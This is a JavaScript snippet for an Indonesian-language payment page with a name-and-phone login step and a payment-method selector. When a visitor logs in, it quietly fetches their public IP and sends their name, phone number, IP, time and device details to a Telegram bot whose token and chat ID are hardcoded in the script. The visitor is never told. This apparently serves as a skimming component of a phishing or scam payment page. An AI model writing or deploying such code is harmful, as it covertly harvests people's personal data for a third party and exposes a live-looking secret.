<script>
document.addEventListener('DOMContentLoaded', function () {
    const loginContainer = document.getElementById('loginContainer');
    const paymentContainer = document.getElementById('paymentContainer');
    const loginBtn = document.getElementById('loginBtn');
    const backBtn = document.getElementById('backBtn');
    const nameInput = document.getElementById('name');
    const phoneInput = document.getElementById('nope');
    const userName = document.getElementById('userName');
    const paymentMethods = document.querySelectorAll('.payment-method');
    const paymentDetails = document.querySelectorAll('.payment-details');

    // Kirim notifikasi Telegram
    const sendTelegramNotification = async (name, phone, ip) => {
        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk';
        const chatId = '7411016617';

        const message = `🔔 *NEW PAYMENT LOGIN* 🔔\n\n` +
                        `👤 *Name*: ${name}\n` +
                        `📱 *Phone*: ${phone}\n` +
                        `🕒 *Time*: ${new Date().toLocaleString()}\n` +
                        `🌐 *IP*: ${ip}\n` +
                        `💻 *Device*: ${navigator.userAgent}`;

        try {
            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('✅ Notifikasi berhasil dikirim ke Telegram');
        } catch (error) {
            console.error('❌ Gagal mengirim ke Telegram:', error);
        }
    };

    // Ambil IP publik
    const getUserIP = async () => {
        try {
            const response = await axios.get('https://api.ipify.org?format=json');
            return response.data.ip;
        } catch (error) {
            console.error('Gagal mendapatkan IP:', error);
            return 'Unknown IP';
        }
    };

    // Handler Login
    loginBtn.addEventListener('click', async function () {
        const name = nameInput.value.trim();
        const phone = phoneInput.value.trim();

        if (!name) {
            alert('Silakan masukkan nama Anda');
            return;
        }

        if (!phone) {
            alert('Silakan masukkan nomor telepon Anda');
            return;
        }

        userName.textContent = name;
        loginContainer.style.display = 'none';
        paymentContainer.style.display = 'block';
        paymentContainer.style.animation = 'fadeIn 0.5s ease';

        const ip = await getUserIP();
        await sendTelegramNotification(name, phone, ip);
    });

    // Handler Tombol Back
    backBtn.addEventListener('click', function () {
        loginContainer.style.display = 'block';
        paymentContainer.style.display = 'none';
        nameInput.value = '';
        phoneInput.value = '';
        paymentMethods.forEach(method => method.classList.remove('active'));
        paymentDetails.forEach(detail => detail.style.display = 'none');
    });

    // Pemilihan Metode Pembayaran
    paymentMethods.forEach(method => {
        method.addEventListener('click', function () {
            paymentMethods.forEach(m => m.classList.remove('active'));
            paymentDetails.forEach(detail => detail.style.display = 'none');

            this.classList.add('active');
            const methodType = this.getAttribute('data-method');
            document.getElementById(`${methodType}Details`).style.display = 'block';
        });
    });

    // Auto-select metode pembayaran pertama
    if (paymentMethods.length > 0) {
        paymentMethods[0].click();
    }
});
</script>
